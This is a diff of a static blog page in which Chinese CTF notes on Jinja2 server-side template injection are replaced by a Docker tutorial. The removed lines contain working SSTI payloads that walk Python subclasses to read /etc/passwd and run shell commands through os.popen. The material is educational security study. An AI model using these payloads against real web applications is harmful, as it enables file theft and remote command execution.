@@ -16,23 +16,26 @@
   <meta name="author" content="JiAshi">
   <meta name="keywords" content="">
   
-    <meta name="description" content="SSTI漏洞 定义：SSTI 就是服务器端模板注入 (Server-Side Template Injection) 基础知识：例如，在jinja2模板引擎中，{ { } }是变量包裹标识符。{ { } }了并不仅仅可以传递变量，还可以执行一些简单的表达式。">
+    <meta name="description" content="docker命令基础的命令： 12345docker imagesdocker ps -adocker rm xxxdocker rmi xxxdocker pull xxx  启动容器： 123456docker run -d \  --name mysql \  -p 3306:3306 \  -e TZ&#x3D;Asia&#x2F;Shanghai \  -e MYSQL_ROOT_PASSWORD&#x3D;123">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SSTI漏洞">
-<meta property="og:url" content="https://jiashi19.github.io/2023/10/27/SSTI%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:title" content="docker">
+<meta property="og:url" content="https://jiashi19.github.io/2024/11/28/docker/index.html">
 <meta property="og:site_name" content="Blog from jiAshi19">
-<meta property="og:description" content="SSTI漏洞 定义：SSTI 就是服务器端模板注入 (Server-Side Template Injection) 基础知识：例如，在jinja2模板引擎中，{ { } }是变量包裹标识符。{ { } }了并不仅仅可以传递变量，还可以执行一些简单的表达式。">
+<meta property="og:description" content="docker命令基础的命令： 12345docker imagesdocker ps -adocker rm xxxdocker rmi xxxdocker pull xxx  启动容器： 123456docker run -d \  --name mysql \  -p 3306:3306 \  -e TZ&#x3D;Asia&#x2F;Shanghai \  -e MYSQL_ROOT_PASSWORD&#x3D;123">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-10-27T14:11:40.000Z">
-<meta property="article:modified_time" content="2024-07-21T11:16:59.140Z">
+<meta property="og:image" content="https://jiashi19.github.io/img/image-20241116170056787.png">
+<meta property="og:image" content="https://jiashi19.github.io/img/image-20241116191321608.png">
+<meta property="article:published_time" content="2024-11-28T13:38:43.000Z">
+<meta property="article:modified_time" content="2024-11-28T13:42:13.962Z">
 <meta property="article:author" content="JiAshi">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://jiashi19.github.io/img/image-20241116170056787.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>SSTI漏洞 - Blog from jiAshi19</title>
+  <title>docker - Blog from jiAshi19</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -198,7 +201,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="SSTI漏洞"></span>
+            <span id="subtitle" data-typed-text="docker"></span>
           
         </div>
 
@@ -209,8 +212,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-10-27 22:11" pubdate>
-          2023年10月27日 晚上
+        <time datetime="2024-11-28 21:38" pubdate>
+          2024年11月28日 晚上
         </time>
       </span>
     
@@ -221,7 +224,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          718 字
+          1.2k 字
         
       </span>
     
@@ -232,7 +235,7 @@
         
         
         
-          6 分钟
+          11 分钟
         
       </span>
     
@@ -269,52 +272,130 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">SSTI漏洞</h1>
+            <h1 id="seo-header">docker</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="SSTI漏洞"><a href="#SSTI漏洞" class="headerlink" title="SSTI漏洞"></a>SSTI漏洞</h1><ul>
-<li>定义：SSTI 就是服务器端模板注入 (Server-Side Template Injection)</li>
-<li>基础知识：例如，在jinja2模板引擎中，{ { } }是变量包裹标识符。{ { } }了并不仅仅可以传递变量，还可以执行一些简单的表达式。<span id="more"></span></li>
+                <span id="more"></span>
+<h2 id="docker命令"><a href="#docker命令" class="headerlink" title="docker命令"></a>docker命令</h2><p>基础的命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker images<br>docker ps -a<br>docker <span class="hljs-built_in">rm</span> xxx<br>docker rmi xxx<br>docker pull xxx<br></code></pre></td></tr></table></figure>
+
+<p>启动容器：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -d \<br>  --name mysql \<br>  -p 3306:3306 \<br>  -e TZ=Asia/Shanghai \<br>  -e MYSQL_ROOT_PASSWORD=123 \<br>  mysql:5.7<br></code></pre></td></tr></table></figure>
+
+<p>-d:  让容器后台运行</p>
+<p>–name： 给容器命名</p>
+<p>-e: 环境变量</p>
+<p>-p: 宿主机端口映射到容器内端口   </p>
+<p>镜像名称结构：Repository:TAG</p>
+<p><img src="/../img/image-20241116170056787.png" srcset="/img/loading.gif" lazyload alt="image-20241116170056787"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker save -o nginx.tar<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker load -i nginx.tar <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> -it nginx bash<br></code></pre></td></tr></table></figure>
+
+<p>比较好用的调试命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker logs xxx <span class="hljs-comment"># 查看日志信息，比如可以检查java程序启动状况</span><br>docker <span class="hljs-built_in">exec</span> -it xxx /bin/bash <span class="hljs-comment"># 连接shell</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="docker-数据卷挂载"><a href="#docker-数据卷挂载" class="headerlink" title="docker 数据卷挂载"></a>docker 数据卷挂载</h2><p>数据卷 volume, 宿主机和容器之间的中间桥梁.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker volume create<br><br>docker volume <span class="hljs-built_in">ls</span><br><br>docker volume <span class="hljs-built_in">rm</span><br><br>docker volume inspect<br><br>docker volume prune<br></code></pre></td></tr></table></figure>
+
+<p>使用-v命令，会自动创建和挂载。</p>
+<p>注：</p>
+<ul>
+<li>在执行docker运行命令时，使用-v <strong>本地目录</strong>:<strong>容器内目录</strong>可以完成本地目录挂载；</li>
+<li>本地目录必须以“&#x2F;”或”.&#x2F;“开头，如果直接以名称开头，会被识别为数据卷而非本地目录；</li>
+<li>-v mysql:&#x2F;var&#x2F;lib&#x2F;mysql会被识别为一个数据卷叫mysql；</li>
+<li>-v .&#x2F;mysql:&#x2F;var&#x2F;lib&#x2F;mysql 会被识别为当前目录下的mysql目录。</li>
 </ul>
-<h2 id="Flask-jinja2模版漏洞"><a href="#Flask-jinja2模版漏洞" class="headerlink" title="Flask jinja2模版漏洞"></a>Flask jinja2模版漏洞</h2><p>魔术方法：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">__dict__ <span class="hljs-comment">#保存类实例或对象实例的属性变量键值对字典</span><br><br>__class__ <span class="hljs-comment">#返回调用的参数类型</span><br><br>__mro__ <span class="hljs-comment">#返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br>__base__<br>__bases__<br><br>__subclasses__()<span class="hljs-comment">#返回子类</span><br><br>__init__<span class="hljs-comment">#类的初始化方法</span><br><br>__globals__<span class="hljs-comment">#函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</span><br></code></pre></td></tr></table></figure>
+<p><img src="/../img/image-20241116191321608.png" srcset="/img/loading.gif" lazyload alt="image-20241116191321608"></p>
+<p><strong>mountpoint</strong>：在宿主机中的文件位置。</p>
+<h2 id="Dockerfile与自定义镜像"><a href="#Dockerfile与自定义镜像" class="headerlink" title="Dockerfile与自定义镜像"></a>Dockerfile与自定义镜像</h2><p>镜像结构分层：分为多层（Layer），体现为pull镜像时会拉取多个。</p>
+<p>基础镜像（BaseImage）：依赖的系统函数库，环境，配置，文件等。</p>
+<p>–&gt;</p>
+<p>层（Layer）：多个，添加更多的安装包，依赖等。</p>
+<p>–&gt;</p>
+<p>入口（Entrypoint）：一般是程序启动的脚本or参数。</p>
+<p>那<strong>什么是Dockerfile</strong>:  类似于脚本文件，有一条条的指令，来指导构建镜像。</p>
+<p>部分语法如下：</p>
+<table>
+<thead>
+<tr>
+<th><strong>指令</strong></th>
+<th><strong>说明</strong></th>
+<th><strong>示例</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>FROM</td>
+<td>指定基础镜像</td>
+<td>FROM centos:6</td>
+</tr>
+<tr>
+<td>ENV</td>
+<td>设置环境变量，可在后面指令使用</td>
+<td>ENV key value</td>
+</tr>
+<tr>
+<td>COPY</td>
+<td>拷贝本地文件到镜像的指定目录</td>
+<td>COPY .&#x2F;jre11.tar.gz &#x2F;tmp</td>
+</tr>
+<tr>
+<td>RUN</td>
+<td>执行Linux的shell命令，一般是安装过程的命令</td>
+<td>RUN tar -zxvf &#x2F;tmp&#x2F;jre11.tar.gz&amp;&amp; EXPORTS path&#x3D;&#x2F;tmp&#x2F;jre11:$path</td>
+</tr>
+<tr>
+<td>EXPOSE</td>
+<td>指定容器运行时监听的端口，是给镜像使用者看的</td>
+<td>EXPOSE 8080</td>
+</tr>
+<tr>
+<td>ENTRYPOINT</td>
+<td>镜像中应用的启动命令，容器运行时调用</td>
+<td>ENTRYPOINT java -jar xx.jar</td>
+</tr>
+</tbody></table>
+<p>例：构建一个运行springboot的jar项目，Dockerfile内容如下：</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># 基础镜像</span><br><span class="hljs-keyword">FROM</span> openjdk:<span class="hljs-number">11.0</span>-jre-buster<br><span class="hljs-comment"># 设定时区</span><br><span class="hljs-keyword">ENV</span> TZ=Asia/Shanghai<br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">ln</span> -snf /usr/share/zoneinfo/<span class="hljs-variable">$TZ</span> /etc/localtime &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$TZ</span> &gt; /etc/timezone</span><br><span class="hljs-comment"># 拷贝jar包</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> project.jar /app.jar</span><br><span class="hljs-comment"># 入口</span><br><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">&quot;java&quot;</span>, <span class="hljs-string">&quot;-jar&quot;</span>, <span class="hljs-string">&quot;/app.jar&quot;</span>]</span><br></code></pre></td></tr></table></figure>
 
-<p><strong>利用方法&amp;实现思路</strong>：在python中，object类是Python中所有类的基类，如果定义没有指定继承哪个类，则默认继承object类。通过python的对象的继承来一步步实现文件读取和命令执行。</p>
-<h3 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a><strong>基本步骤</strong></h3><ol>
-<li>找到父类&lt;type ‘object’&gt;</li>
-<li>寻找子类</li>
-<li>找关于命令执行或者文件操作的模块</li>
+
+
+<p>根据Dockerfile在本地构建镜像的命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build -t myjava:1.0 .  <span class="hljs-comment"># .表示在当前目录下找Dockerfile</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="docker网络"><a href="#docker网络" class="headerlink" title="docker网络"></a>docker网络</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker network xxx<br></code></pre></td></tr></table></figure>
+
+<p>docker的bridge网络模式是Docker的默认网络模式。当Docker进程启动时，它会在主机上创建一个名为<strong>docker0的虚拟网桥</strong>。此主机上启动的Docker容器会连接到这个虚拟网桥上。这个虚拟网桥的工作方式类似于物理交换机，使得主机上的所有容器都通过交换机连接在一个二层网络中。<br>容器内部会有一个虚拟网卡，名为eth0，容器之间可以通过这个虚拟网卡和内部的IP地址进行通信。另外，从docker0子网中分配一个IP给容器使用，并设置docker0的IP地址为容器的默认网关。</p>
+<p>创建的两个容器如果没有指定相同的网络，会使用默认的bridge 模式的名为bridge的网络，只能通过ip访问，如果指定了自定义的网络（bridge模式），也可以进行dns解析。（q:通过容器名访问是怎么实现的？）</p>
+<p>如果要部署自己的一个多容器微服务，最好创建一个新的虚拟bridge网络：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker network create net1<br></code></pre></td></tr></table></figure>
+
+<p><strong>参考</strong>：</p>
+<p>docker网络进阶1：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiongzaiqiren/p/18177383/docker-network">docker网络配置：bridge模式、host模式、container模式、none模式 - 熊仔其人 - 博客园 (cnblogs.com)</a></p>
+<p>docker网络进阶2：<a target="_blank" rel="noopener" href="https://juejin.cn/post/7041923410649153543">全网最详细的Docker网络教程详解Docker网络详解 Docker网路基础理论 docker使用Linux桥接网卡， - 掘金 (juejin.cn)</a></p>
+<p>创建新的bridge网络与默认的bridge网络有什么区别：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/258939355">两个或多个docker容器之间通过名字相互访问 - 知乎 (zhihu.com)</a></p>
+<h3 id="docker网络问题解决"><a href="#docker网络问题解决" class="headerlink" title="docker网络问题解决"></a>docker网络问题解决</h3><ol>
+<li><p>docker网络疑难杂症解决：<a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/1416790">【docker】重建docker0网桥-阿里云开发者社区 (aliyun.com)</a></p>
+</li>
+<li><p>虚拟机docker断连问题：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46439731/article/details/128124219">解决每次挂起VM虚拟机后，docker容器无法访问的问题</a> –[原文 stackoverflow](<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/57874055/cant-connect-to-docker-after-resuming-vm">Can’t connect to docker after resuming VM - Stack Overflow</a>)</p>
+</li>
 </ol>
-<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>拿到object类的方法：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>]<br>[].__class__.__base__<br>[].__class__.__bases__[<span class="hljs-number">0</span>]<br><span class="hljs-comment">#具体情况感觉不一定，需要验证。利用&#x27;&#x27;.__class__.__mro__ 再确定索引</span><br></code></pre></td></tr></table></figure>
+<p>总结：如果发现连接不上docker，可以先用<code>ifconfig -a</code>检查docker0，发现其down了，可以临时用1方法解决。但每次vmware挂起似乎都会导致docker0网卡down，长久的解决方案参考2方法。</p>
+<h2 id="DockerCompose"><a href="#DockerCompose" class="headerlink" title="DockerCompose"></a>DockerCompose</h2><p>通过docker-compose.yml来实现<strong>多个</strong>互相关联的docker容器的快速部署。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker compose up -d<br>docker compose down<br>docker compose ps <span class="hljs-comment">#查看当前项目下所有容器</span><br></code></pre></td></tr></table></figure>
 
-<p>获取子类：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#object.__subclasses__()</span><br><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()<br></code></pre></td></tr></table></figure>
+<p>Docker Compose 会检查每个服务的镜像是否已经存在。<strong>如果镜像已经存在，它不会重新构建镜像</strong>，而是直接使用现有的镜像来启动容器。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker compose up --build //强制重新构建镜像<br></code></pre></td></tr></table></figure>
 
-<p>找到object的子类warnings.catch_warnings：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#[].__class__.__base__.__subclasses__().index(warnings.catch_warnings) 该函数暂未成功实现过</span><br>[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>]<span class="hljs-comment">#默认在59,但有时候会不在，可以利用循环去找，下列具体操作中有示例</span><br></code></pre></td></tr></table></figure>
 
-<h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p>利用file类：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;<br>	&#123;% if c.__name__==&#x27;file&#x27; %&#125;<br>		&#123;&#123;&quot;find!&quot;&#125;&#125;<br>		&#123;&#123; c(&quot;/etc/passwd&quot;).readlines() &#125;&#125;<br>	&#123;% endif %&#125;<br>&#123;% endfor %&#125;<br><br></code></pre></td></tr></table></figure>
 
-<p>或者还是利用catch_warnings类：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;#提前找到了catch_warnings#&#125;<br>&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;, &#x27;r&#x27;).read()&#125;&#125;<br>&#123;#利用循环找catch_warnings#&#125;<br>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;<br>	&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;      <br>		&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;, &#x27;r&#x27;).read() &#125;&#125;<br>	&#123;% endif %&#125;<br>&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;#利用循环找catch_warnings#&#125;<br>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;<br>    &#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;<br>        &#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&#x27;open(&quot;/etc/passwd&quot;, &quot;r&quot;).read()&#x27;) &#125;&#125;<br>    &#123;% endif %&#125;<br>&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure>
-
-<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>(有些执行命令的方式无回显，而当前方法可以看到回显)</p>
-<p>如果catch_warnings已经找到：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure>
-
-<p>如果没找到（利用循环遍历寻找）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;<br>    &#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;<br>      &#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;<br>    &#123;% endif %&#125;<br>&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure>
-
-<h3 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h3><p>待学习。。。</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://houwenda.github.io/2020/02/22/jinja2-ssti/">https://houwenda.github.io/2020/02/22/jinja2-ssti/</a> </p>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/93746437">https://zhuanlan.zhihu.com/p/93746437</a></p>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/596279414">https://zhuanlan.zhihu.com/p/596279414</a></p>
+<p>记一句：如果真遇到什么连接不通或者其他疑难杂症，直接<strong>重启</strong>解决80%问题！</p>
 
                 
               </div>
@@ -333,17 +414,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/ctf-web/" class="category-chain-item">ctf-web</a>
-  
-  
-
-      </span>
-    
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
+  <a href="/categories/others/" class="category-chain-item">others</a>
   
   
 
@@ -363,8 +434,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>SSTI漏洞</div>
-      <div>https://jiashi19.github.io/2023/10/27/SSTI漏洞/</div>
+      <div>docker</div>
+      <div>https://jiashi19.github.io/2024/11/28/docker/</div>
     </div>
     <div class="license-meta">
       
@@ -376,7 +447,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年10月27日</div>
+          <div>2024年11月28日</div>
         </div>
       
       
@@ -408,9 +479,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/11/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="命令执行">
+                      <a href="/2024/11/28/%E5%BE%AE%E6%9C%8D%E5%8A%A1/" title="微服务">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">命令执行</span>
+                        <span class="hidden-mobile">微服务</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -418,8 +489,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/10/16/ctf-web-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="ctf-web-php伪协议">
-                        <span class="hidden-mobile">ctf-web-php伪协议</span>
+                      <a href="/2024/07/21/git/" title="git">
+                        <span class="hidden-mobile">git</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
